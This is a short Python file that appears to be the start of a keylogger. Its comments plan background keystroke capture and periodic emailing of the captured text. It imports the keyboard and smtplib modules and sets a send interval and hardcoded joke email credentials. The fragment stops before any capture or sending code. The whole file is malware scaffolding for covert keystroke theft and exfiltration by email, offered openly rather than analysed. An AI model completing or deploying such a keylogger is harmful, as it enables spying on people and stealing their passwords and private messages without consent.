# listen to keystrokes in the background
# whenever a key is pressed, add it to global string variable
# every X number of minutes, write this string to local file or email

# look into 'keyloggers' module

import keyboard
import smtplib

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_INTERVAL = 120 # number of seconds to send the string
EMAIL_ADDRESS = "dwight.schrute@dundermifflin.com"
EMAIL_PASSWORD = "bearsbeetsbattlestargalactica"

